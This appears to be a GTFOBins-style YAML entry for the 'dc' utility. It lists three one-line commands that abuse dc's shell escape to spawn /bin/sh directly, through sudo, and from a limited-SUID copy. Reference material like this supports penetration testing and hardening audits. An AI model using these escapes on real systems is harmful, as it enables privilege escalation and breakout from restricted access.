---
functions:
  shell:
    - code: dc -e '!/bin/sh'
  sudo:
    - code: sudo dc -e '!/bin/sh'
  limited-suid:
    - code: ./dc -e '!/bin/sh'
---
